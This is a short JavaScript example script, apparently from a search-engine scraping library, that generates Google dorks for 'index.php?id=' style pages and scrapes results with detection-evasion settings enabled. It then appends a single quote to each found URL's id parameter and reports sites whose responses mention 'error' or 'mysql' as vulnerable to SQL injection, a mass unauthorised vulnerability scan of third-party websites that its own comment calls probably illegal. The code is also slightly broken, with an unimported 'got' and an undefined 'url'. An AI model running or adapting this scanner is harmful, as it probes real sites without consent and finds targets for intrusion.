
/*
 * Do not run this, this is probably illegal in your country ;)
 */

const se_scraper = require('./../index.js');


// generate some google dorks

function genGoogleDorks(iter=4) {
    let lulz_keywords = [];
    ['seite', 'inicio', 'index'].forEach((x) => {
        for (var i = 0; i < iter; i++) {
            lulz_keywords.push(
                'inurl:"' + x + '.php?id=' + Math.floor(Math.random() * 100) + '"'
            )
        }
    });
    return lulz_keywords;
}

const lulz_keywords = genGoogleDorks();
console.log(lulz_keywords);


// those options need to be provided on startup
// and cannot give to se-scraper on scrape() calls
let browser_config = {
    // if random_user_agent is set to True, a random user agent is chosen
    random_user_agent: true,
    headless: true,
    is_local: false,
    throw_on_detection: false,
    puppeteer_cluster_config: {
        headless: true,
        timeout: 2 * 60 * 1000, // max timeout set to 2 minutes
        monitor: false,
        concurrency: 3, // one scraper per tab
        maxConcurrency: 4, // scrape with 4 tabs
    }
};

(async () => {
    // scrape config can change on each scrape() call
    let lulz_config = {
        // which search engine to scrape
        search_engine: 'google',
        // an array of keywords to scrape
        keywords: lulz_keywords,
        // the number of pages to scrape for each keyword
        num_pages: 3,
        // how long to sleep between requests. a random sleep interval within the range [a,b]
        // is drawn before every request. empty string for no sleeping.
        sleep_range: '',
        // path to output file, data will be stored in JSON
        output_file: 'goodboys.json',
        // whether to prevent images, css, fonts from being loaded
        // will speed up scraping a great deal
        block_assets: true,
        // check if headless chrome escapes common detection techniques
        // this is a quick test and should be used for debugging
        test_evasion: false,
        apply_evasion_techniques: true,
        // log ip address data
        log_ip_address: false,
        // log http headers
        log_http_headers: false,
    };

    let results = await se_scraper.scrape(browser_config, lulz_config);

    const all_links = [];

    for (var kw in results) {
        for (var page in results[kw]) {
            for (var res of results[kw][page]['results']) {
                all_links.push(res.link);
            }
        }
    }

    console.log(all_links);

    for (var link of all_links) {
        try {
            const response = await got(link.replace(/(id=\d+)/g, "$1'"));
            let html = response.body;
            if (html.includes('error') || html.includes('mysql')) {
                console.log('Got a mysql injection in ' + url);
            }
        } catch (error) {
            console.log(error.response.statusCode);
        }
    }

})();